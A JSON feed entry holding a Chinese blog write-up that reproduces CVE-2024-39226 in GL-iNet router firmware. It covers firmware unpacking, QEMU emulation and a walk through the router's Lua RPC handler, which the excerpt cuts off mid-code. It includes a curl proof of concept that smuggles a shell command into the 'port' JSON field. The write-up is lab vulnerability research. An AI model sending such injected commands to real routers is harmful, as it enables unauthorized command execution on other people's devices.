{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"实战\" category",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2025/03/21/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/",
            "url": "https://yhuanhuan01.github.io/2025/03/21/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/",
            "title": "GL-iNet_路由器-CVE-2024-39226",
            "date_published": "2025-03-21T11:01:36.000Z",
            "content_html": "<h1 id=\"gl-net路由器cve-2024-39226复现分析\"><a class=\"markdownIt-Anchor\" href=\"#gl-net路由器cve-2024-39226复现分析\">#</a> GL-Net 路由器 cve-2024-39226 复现分析</h1>\n<h3 id=\"1描述\"><a class=\"markdownIt-Anchor\" href=\"#1描述\">#</a> 1. 描述：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dsLWluZXQvQ1ZFLWlzc3Vlcy9ibG9iL21haW4vNC4wLjAvczJzJTIwaW50ZXJmYWNlJTIwc2hlbGwlMjBpbmplY3Rpb24ubWQ=\">该漏洞可被利用通过 s2s API 传递恶意 shell 命令来操纵路由器。</span></p>\n<p>从请求体中的 json 数据中获取 port，下面对获取到的 port 的字符串进行了校验，但是并不严格。</p>\n<h3 id=\"2仿真模拟\"><a class=\"markdownIt-Anchor\" href=\"#2仿真模拟\">#</a> 2. 仿真模拟</h3>\n<blockquote>\n<p>固件版本：GL-AX1800 Flint 4.5.16</p>\n</blockquote>\n<p>下载地址👉https://dl.gl-inet.cn/</p>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_0\" checked=\"true\" disabled=\"true\"><label for=\"cbx_0\"> <s>进行解压 openwrt-ax1800-4.5.16-0321-1711030388.tar</s></label></li>\n</ul>\n<p>解压后有 root 文件，进行 binwalk -Me 解包</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ binwalk <span class=\"token parameter variable\">-Me</span> root</pre></td></tr></table></figure><blockquote>\n<p>yhuan@h711:~/Desktop/IOT 分析 / GL-iNet/_root.extracted/squashfs-root/bin$</p>\n<p>file busybox</p>\n<p>busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-arm.so.1, no section header</p>\n</blockquote>\n<p>得知是 32 位 ARM 的架构</p>\n<h5 id=\"qemu仿真\"><a class=\"markdownIt-Anchor\" href=\"#qemu仿真\">#</a> qemu 仿真：</h5>\n<p>在 qemu 仿真时，踩了不少坑。好好写写</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW9wbGUuZGViaWFuLm9yZy9+Z2lvL2RxaWIv\">镜像下载地址点这里</span></p>\n<p>下载完镜像之后，进行宿主机的网络配置，前提要有 <code>qemu-system-arm</code></p>\n<blockquote>\n<p>sudo apt install libvirt <code>-</code> daemon <code>-</code> system libvirt <code>-</code> clients virt <code>-</code> manager</p>\n</blockquote>\n<p>搭建虚拟网桥</p>\n<p>没有的情况可以自己配置一个</p>\n<blockquote>\n<p>sudo brctl addbr virbr0     # 创建桥接</p>\n<p>sudo ip link set virbr0 up  # 启动桥接</p>\n<p>sudo ip addr add 192.168.122.1/24 dev virbr0</p>\n</blockquote>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250320173132945.png\" alt=\"image-20250320173132945\"></p>\n<p>类似于这个，创建并启用名为 tap0 的 TAP 设备，再将其添加到 virbr0 网桥中，并修改文件权限。</p>\n<blockquote>\n<p>sudo ip tuntap add dev tap0 mode tap<br>\nsudo ip link set tap0 up<br>\nsudo brctl addif virbr0 tap0<br>\nsudo chmod 666 /dev/net/tun</p>\n</blockquote>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250320173432692.png\" alt=\"image-20250320173432692\"></p>\n<p>类似于这样，加下来使用 <code>brctl show</code>  看一下网桥状态</p>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250320173528769.png\" alt=\"image-20250320173528769\"></p>\n<p>这样可以进行后面的操作了，若<strong> STP enabled</strong> (命令功能 stp v-stp enable 命令<strong>用来使能 STP 进入跨设备组合工作模式</strong>。 undo stp v-stp enable 命令用来去使能 STP 进入跨设备组合工作模式。 缺省情况下，STP 进入跨设备组合工作模式处于去使能状态) 显示 no，使用下面的命令即可</p>\n<p><code>sudo brctl stp virbr0 on</code></p>\n<p>使用 qemu 进行引导</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> qemu-system-arm <span class=\"token parameter variable\">-machine</span> <span class=\"token string\">'virt'</span> <span class=\"token parameter variable\">-cpu</span> <span class=\"token string\">'cortex-a15'</span> <span class=\"token parameter variable\">-m</span> 1G <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token parameter variable\">-device</span> virtio-blk-device,drive<span class=\"token operator\">=</span>hd <span class=\"token parameter variable\">-drive</span> <span class=\"token assign-left variable\">file</span><span class=\"token operator\">=</span>image.qcow2,if<span class=\"token operator\">=</span>none,id<span class=\"token operator\">=</span>hd <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token parameter variable\">-device</span> virtio-net-device,netdev<span class=\"token operator\">=</span>net <span class=\"token parameter variable\">-netdev</span> tap,id<span class=\"token operator\">=</span>net,ifname<span class=\"token operator\">=</span>tap0,script<span class=\"token operator\">=</span>no,downscript<span class=\"token operator\">=</span>no <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token parameter variable\">-kernel</span> kernel <span class=\"token parameter variable\">-initrd</span> initrd <span class=\"token parameter variable\">-nographic</span> <span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token parameter variable\">-append</span> <span class=\"token string\">\"root=LABEL=rootfs console=ttyAMA0\"</span></pre></td></tr></table></figure><p>仿真完成后进行 qemu 内虚拟机网络配置</p>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250320174057315.png\" alt=\"image-20250320174057315\"></p>\n<blockquote>\n<p>root@debian:~# ip add add 192.168.122.130/24 dev eth0                                                                                                                                       root@debian:~# ip link set eth0 up<br>\nroot@debian:~# ip route add default via 192.168.122.1</p>\n</blockquote>\n<p>然后进入宿主机进行文件系统传输，一定要上 sudo，要不可能会有文件缺失</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">scp</span> <span class=\"token parameter variable\">-r</span> squashfs-root/ root@192.168.122.130:/root</pre></td></tr></table></figure><p>挂载文件系统，并启动 shell (可以在一个系统的虚拟机上传不同版本的 suqashfs-root，选择挂载进入的，可以写出不同的 sh 脚本)</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> squashfs-root/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">mount</span> <span class=\"token parameter variable\">-t</span> proc /proc ./proc/</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">mount</span> <span class=\"token parameter variable\">-o</span> <span class=\"token builtin class-name\">bind</span> /dev ./dev/</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">chroot</span> <span class=\"token punctuation\">..</span>/squashfs-root/ <span class=\"token function\">sh</span></pre></td></tr></table></figure><p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250320174517897.png\" alt=\"image-20250320174517897\"></p>\n<p>使用下面命令，可以在宿主机访问 192.168.122.130 进入路由器管理页面，可完成初始密码设置并登录进入管理面板过程，想实现更多功能的启用就要摸索更多配置了，不过我们分析复现授权相关过程已经够用了。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#第一次运行这些</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">mkdir</span> /var/log</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">mkdir</span> /var/log/nginx</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">mkdir</span> /var/lib</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">mkdir</span> /var/lib/nginx</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">mkdir</span> /var/lib/nginx/body</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">mkdir</span> /var/run</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">chmod</span> +x  /etc/uci-defaults/80_nginx-oui</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>/etc/uci-defaults/80_nginx-oui</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">chmod</span> +x /etc/uci-defaults/network_gl</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>/etc/uci-defaults/network_gl</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>/etc/init.d/boot boot</pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#后面重启运行这些即可</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>/sbin/ubusd <span class=\"token operator\">&amp;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>/usr/sbin/gl-ngx-session <span class=\"token operator\">&amp;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>/usr/bin/fcgiwrap <span class=\"token parameter variable\">-c</span> <span class=\"token number\">4</span> <span class=\"token parameter variable\">-s</span> unix:/var/run/fcgiwrap.socket <span class=\"token operator\">&amp;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>/usr/sbin/nginx <span class=\"token parameter variable\">-c</span> /etc/nginx/nginx.conf <span class=\"token parameter variable\">-g</span> <span class=\"token string\">'daemon off;'</span> <span class=\"token operator\">&amp;</span></pre></td></tr></table></figure><p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250320175218197.png\" alt=\"image-20250320175218197\"></p>\n<p>出现此界面，仿真成功</p>\n<h3 id=\"3漏洞分析\"><a class=\"markdownIt-Anchor\" href=\"#3漏洞分析\">#</a> 3. 漏洞分析</h3>\n<p><strong>POC：</strong> <code>curl -H 'glinet: 1' 127.0.0.1/rpc -d '&#123;&quot;method&quot;:&quot;call&quot;, &quot;params&quot;:[&quot;&quot;, &quot;s2s&quot;, &quot;enable_echo_server&quot;, &#123;&quot;port&quot;: &quot;7 $(touch /root/test)&quot;&#125;]&#125;'</code></p>\n<p>根据纰漏的 poc 发现，他请求的路由是 /rpc，然后在 /etc/nginx 下的 nginx 配置文件找下 rpc 的相关信息。</p>\n<p><img data-src=\"imgimg/GL-iNet_%E8%B7%AF%E7%94%B1%E5%99%A8_CVE-2024-39226/image-20250320180810258.png\" alt=\"image-20250320180810258\"></p>\n<p>可以了解到请求 rpc 路径的处理方法在  <code>/usr/share/gl-ngx/oui-rpc.lua</code></p>\n<figure class=\"highlight lua\"><figcaption data-lang=\"lua\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">local</span> cjson <span class=\"token operator\">=</span> require <span class=\"token string\">\"cjson\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">local</span> rpc <span class=\"token operator\">=</span> require <span class=\"token string\">\"oui.rpc\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">local</span> ubus <span class=\"token operator\">=</span> require <span class=\"token string\">\"oui.ubus\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode_empty_table_as_object</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">false</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> ngx<span class=\"token punctuation\">.</span>req<span class=\"token punctuation\">.</span><span class=\"token function\">get_method</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"POST\"</span> <span class=\"token keyword\">then</span> <span class=\"token comment\">-- 检查 HTTP 请求方法是否为 POST</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>ngx<span class=\"token punctuation\">.</span>HTTP_FORBIDDEN<span class=\"token punctuation\">)</span> <span class=\"token comment\">-- 如果不是，返回 403 Forbidden。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>ngx<span class=\"token punctuation\">.</span>req<span class=\"token punctuation\">.</span><span class=\"token function\">read_body</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- 获取请求体</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">local</span> data <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>req<span class=\"token punctuation\">.</span><span class=\"token function\">get_body_data</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- 如果数据直接存在于 body 中，则获取</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> data <span class=\"token keyword\">then</span> <span class=\"token comment\">-- 否则从临时文件中读取，这可能处理较大的请求体。</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">local</span> name <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>req<span class=\"token punctuation\">.</span><span class=\"token function\">get_body_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">local</span> f <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">:</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*a\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    f<span class=\"token punctuation\">:</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">rpc_method_challenge</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">local</span> res <span class=\"token operator\">=</span> ubus<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gl-session\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"challenge\"</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">local</span> code<span class=\"token punctuation\">,</span> data <span class=\"token operator\">=</span> res<span class=\"token punctuation\">.</span>code<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">.</span>data</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> code <span class=\"token operator\">~=</span> <span class=\"token number\">0</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> code<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">result_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">end</span> <span class=\"token comment\">-- 调用 gl-session 服务的 challenge 方法，生成认证挑战码（用于后续登录验证）。</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">rpc_method_login</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">local</span> res <span class=\"token operator\">=</span> ubus<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gl-session\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"login\"</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">local</span> code<span class=\"token punctuation\">,</span> data <span class=\"token operator\">=</span> res<span class=\"token punctuation\">.</span>code<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">.</span>data</pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">if</span> code <span class=\"token operator\">~=</span> <span class=\"token number\">0</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> code<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span>header<span class=\"token punctuation\">[</span><span class=\"token string\">\"Set-Cookie\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Admin-Token=\"</span> <span class=\"token operator\">..</span> data<span class=\"token punctuation\">.</span>sid</pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">result_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">end</span> <span class=\"token comment\">-- 调用 login 方法验证用户凭证，成功时设置 Cookie Admin-Token 为会话 ID（sid）。</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">rpc_method_logout</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    ubus<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gl-session\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"logout\"</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">result_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">end</span> <span class=\"token comment\">-- 终止当前会话。</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">rpc_method_alive</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">local</span> res <span class=\"token operator\">=</span> ubus<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gl-session\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"touch\"</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">.</span>code <span class=\"token operator\">~=</span> <span class=\"token number\">0</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">.</span>code<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">result_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">end</span> <span class=\"token comment\">-- 通过 touch 方法刷新会话有效期。</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">rpc_method_call</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token operator\">#</span>params <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_INVALID_PARAMS<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">local</span> sid<span class=\"token punctuation\">,</span> object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args <span class=\"token operator\">=</span> params<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>sid<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"string\"</span> <span class=\"token keyword\">or</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"string\"</span> <span class=\"token keyword\">or</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>method<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"string\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_INVALID_PARAMS<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token 